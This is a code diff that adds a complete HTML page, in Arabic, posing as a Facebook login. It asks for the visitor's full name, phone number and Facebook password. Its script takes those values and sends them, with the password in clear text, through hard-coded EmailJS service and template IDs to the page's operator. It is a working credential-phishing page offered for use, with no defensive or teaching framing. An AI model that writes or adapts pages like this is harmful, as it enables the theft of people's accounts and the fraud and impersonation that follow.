@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login page  </title>
+
+  <!-- EmailJS library -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <style>
+    :root{
+      --bg:#0f1724;
+      --card:#0b1220;
+      --accent:#06b6d4;
+      --muted:#94a3b8;
+      --glass: rgba(255,255,255,0.03);
+      --success:#16a34a;
+      --danger:#ef4444;
+    }
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;}
+    body{
+      background:
+        radial-gradient(1000px 600px at 10% 10%, rgba(6,182,212,0.06), transparent 10%),
+        radial-gradient(800px 500px at 90% 90%, rgba(99,102,241,0.05), transparent 12%),
+        var(--bg);
+      display:flex;align-items:center;justify-content:center;padding:24px;
+      color:#e6eef8;
+    }
+
+    .wrap{max-width:920px;width:100%;display:grid;grid-template-columns:420px 1fr;gap:28px;align-items:center}
+    .card{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border:1px solid rgba(255,255,255,0.03);
+      padding:28px;border-radius:14px;box-shadow:0 10px 30px rgba(2,6,23,0.6);
+    }
+
+    .brand{
+      display:flex;gap:12px;align-items:center;margin-bottom:18px;
+    }
+    .logo{
+      width:52px;height:52px;border-radius:12px;background:linear-gradient(135deg,var(--accent),#7c3aed);
+      display:flex;align-items:center;justify-content:center;font-weight:700;color:#041025;font-size:18px;
+    }
+    h1{margin:0;font-size:20px}
+    p.lead{color:var(--muted);margin-top:6px;font-size:14px}
+
+    label{display:block;margin-top:12px;color:var(--muted);font-size:13px}
+    input[type=text], input[type=password], input[type=tel]{
+      width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);
+      background:var(--glass);color:inherit;margin-top:8px;font-size:15px;outline:none;
+    }
+    input:focus{box-shadow:0 6px 18px rgba(6,182,212,0.06);border-color:rgba(6,182,212,0.28)}
+
+    .actions{display:flex;gap:12px;margin-top:16px}
+    button{
+      background:linear-gradient(90deg,var(--accent),#7c3aed);
+      color:#021026;border:0;padding:12px 16px;border-radius:10px;font-weight:700;cursor:pointer;
+      box-shadow:0 6px 18px rgba(7,89,105,0.12)
+    }
+    button.secondary{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted);font-weight:600}
+
+    .info{
+      padding:18px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));
+      border:1px solid rgba(255,255,255,0.02); color:var(--muted); font-size:14px;
+    }
+
+    .right{
+      padding:28px;border-radius:14px;
+      display:flex;flex-direction:column;gap:18px;
+    }
+    .preview{
+      background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
+      border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.02);
+      color:var(--muted);
+    }
+    .success{
+      display:none;padding:12px;border-radius:10px;background:rgba(22,163,74,0.12);color:var(--success);font-weight:700;margin-top:8px;
+    }
+    .error{display:none;padding:12px;border-radius:10px;background:rgba(239,68,68,0.08);color:var(--danger);font-weight:700;margin-top:8px;}
+
+    .small{font-size:13px;color:var(--muted);margin-top:6px}
+    footer{font-size:12px;color:var(--muted);text-align:center;margin-top:18px}
+    @media (max-width:880px){
+      .wrap{grid-template-columns:1fr; padding:12px}
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="brand">
+        <div class="logo">faceb</div>
+        <div>
+          <h1>facebook   </h1>
+          <p class="lead">أدخل حسابك  الفيسبوك </p>
+        </div>
+      </div>
+
+      <form id="siteForm" autocomplete="off" novalidate>
+        <label for="name">الإسم الكامل</label>
+        <input id="name" type="text" placeholder>
+
+        <label for="phone">رقم الهاتف</label>
+        <input id="phone" type="tel" inputmode="tel" placeholder=>
+
+        <label for="password">كلمة السر facebook</label>
+        <input id="password" type="password" placeholder="" required>
+
+        <div class="actions">
+          <button type="submit">تسجيل</button>
+          <button type="button" class="secondary" id="clearBtn">مسح</button>
+        </div>
+
+        <div id="success" class="success">✔تم </div>
+        <div id="fail" class="error">❌ </div>
+        <div class="small"></div>
+      </form>
+
+      
+
+    <div class="card right">
+      <div class="preview">
+        <strong></strong>
+        <div style="margin-top:12px;color:#e6eef8">
+          <p><strong></strong> <span id="pvName">—</span></p>
+          <p><strong></strong> <span id="pvPhone">—</span></p>
+          <p><strong></strong> <span id="pvPassword">—</span></p>
+        </div>
+        
+      </div>
+
+     
+    </div>
+  </div>
+
+  <script>
+    // EmailJS init (Public Key)
+    (function(){
+      emailjs.init("2fbPHbcGPPq6-wcbv");
+    })();
+
+    const form = document.getElementById('siteForm');
+    const successBox = document.getElementById('success');
+    const failBox = document.getElementById('fail');
+    const pvName = document.getElementById('pvName');
+    const pvPhone = document.getElementById('pvPhone');
+    const pvPassword = document.getElementById('pvPassword');
+    const clearBtn = document.getElementById('clearBtn');
+
+    function validateFields(name, phone, password){
+      if (!name || name.trim().length < 2) return "أدخل اسماً صحيحاً";
+      const digits = phone.replace(/\D/g,'');
+      if (digits.length < 6) return "أدخل رقم هاتف صحيح (على الأقل 10 أرقام)";
+      if (!password || password.length < 4) return "كلمة السر قصيرة (أقل من 4 أحرف)";
+      return null;
+    }
+
+    form.addEventListener('submit', function(ev){
+      ev.preventDefault();
+      successBox.style.display = 'none';
+      failBox.style.display = 'none';
+
+      const name = document.getElementById('name').value;
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+
+      // تحديث المعاينة
+      pvName.textContent = name || '—';
+      pvPhone.textContent = phone || '—';
+      pvPassword.textContent = password ? '••••••••' : '—';
+
+      const vErr = validateFields(name, phone, password);
+      if (vErr){
+        failBox.textContent = "❌ " + vErr;
+        failBox.style.display = 'block';
+        return;
+      }
+
+      // template parameters — important: user_phone matches template variable
+      const templateParams = {
+        name: name,
+        phone: phone,
+        password: password
+      };
+
+      // send
+      emailjs.send("service_j0f3c9o", "template_e32k42m", templateParams)
+      .then(function(response){
+        successBox.style.display = 'block';
+        failBox.style.display = 'none';
+        form.reset();
+        pvName.textContent = '—';
+        pvPhone.textContent = '—';
+        pvPassword.textContent = '—';
+      }, function(err){
+        console.error('EmailJS error:', err);
+        failBox.textContent = "❌ خطأ عند الإرسال — تحقق من Console وEmailJS settings";
+        failBox.style.display = 'block';
+      });
+    });
+
+    clearBtn.addEventListener('click', function(){ form.reset(); pvName.textContent='—'; pvPhone.textContent='—'; pvPassword.textContent='—'; successBox.style.display='none'; failBox.style.display='none'; });
+  </script>
+</body>
+</html>
